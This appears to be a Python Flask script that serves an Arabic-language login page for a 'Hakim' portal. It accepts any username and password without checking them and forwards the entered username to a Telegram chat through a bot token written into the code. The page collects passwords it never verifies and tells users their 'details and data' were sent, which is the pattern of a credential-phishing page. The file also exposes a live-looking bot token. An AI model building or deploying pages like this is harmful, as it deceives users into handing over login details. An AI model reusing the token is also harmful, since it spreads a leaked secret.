import os
from flask import Flask, render_template_string, request
import telebot

app = Flask(__name__)

# إعدادات بوت التليجرام الخاص بك
TOKEN = "8971876966:AAE3Rdgm5ymlMzwu8IWgXCv8LGCJnmfSBl0"
CHAT_ID = "7640908744"

try:
  bot = telebot.TeleBot(TOKEN)
except:
  bot = None


@app.route("/", methods=["GET", "POST"])
def portal_home():
  if request.method == "POST":
    username = request.form.get("username", "مجهول")

    if bot:
      try:
        bot.send_message(
            CHAT_ID,
            f"🚨 تنبيه جديد من المنصة (الخطة الجديدة): تم تسجيل دخول بواسطة {username}",
        )
      except Exception as e:
        print("خطأ في إرسال التنبيه:", e)

    return """
        <html dir="rtl">
        <body style="background:#0f172a; color:#fff; font-family:Tahoma; text-align:center; padding-top:20vh;">
            <h1 style="color:#38bdf8;">تم تسجيل الدخول بنجاح يا حكيم! 🚀</h1>
            <p style="color:#94a3b8;">تم إرسال كافة التفاصيل والبيانات بنجاح إلى النظام.</p>
        </body>
        </html>
        """

  return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>منصة حكيم - البوابة الجديدة</title>
        <style>
            body { font-family: Tahoma, sans-serif; background-color: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; box-sizing: border-box; }
            h2 { margin-bottom: 20px; color: #38bdf8; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #475569; background: #0f172a; color: #fff; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
            button { background: #0284c7; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h2>بوابة حكيم الجديدة</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="اسم المستخدم / الكود" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit">دخول للمنصة</button>
            </form>
        </div>
    </body>
    </html>
    """


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=5000)